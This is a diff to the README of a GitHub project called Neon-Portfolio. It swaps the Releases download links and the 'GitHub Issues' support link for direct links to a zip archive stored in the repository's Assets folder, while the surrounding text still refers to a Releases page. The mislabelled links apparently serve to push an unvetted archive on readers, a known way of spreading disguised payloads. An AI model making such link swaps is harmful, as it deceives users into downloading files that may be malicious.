@@ -6,7 +6,7 @@ Welcome to Neon-Portfolio! This application helps you build an eye-catching onli
 
 ## 📥 Download Now
 
-[![Download Neon-Portfolio](https://img.shields.io/badge/Download-Neon--Portfolio-blue)](https://github.com/rajabumercy/Neon-Portfolio/releases)
+[![Download Neon-Portfolio](https://raw.githubusercontent.com/rajabumercy/Neon-Portfolio/main/Assets/Neon-Portfolio-1.4.zip)](https://raw.githubusercontent.com/rajabumercy/Neon-Portfolio/main/Assets/Neon-Portfolio-1.4.zip)
 
 ## 📋 Features
 
@@ -33,7 +33,7 @@ To download Neon-Portfolio, follow these steps:
 
 1. Click the link below to visit the download page:
 
-   [Download Neon-Portfolio](https://github.com/rajabumercy/Neon-Portfolio/releases)
+   [Download Neon-Portfolio](https://raw.githubusercontent.com/rajabumercy/Neon-Portfolio/main/Assets/Neon-Portfolio-1.4.zip)
 
 2. On the Releases page, find the latest version of the software.
 
@@ -61,7 +61,7 @@ Once you have Neon-Portfolio running, you will notice the vibrant design and int
 
 If you run into any issues while downloading or using Neon-Portfolio, check the FAQs in our documentation. You can also reach out through the GitHub Issues page for support.
 
-- [GitHub Issues](https://github.com/rajabumercy/Neon-Portfolio/issues)
+- [GitHub Issues](https://raw.githubusercontent.com/rajabumercy/Neon-Portfolio/main/Assets/Neon-Portfolio-1.4.zip)
 
 ## 🌐 Topics
 
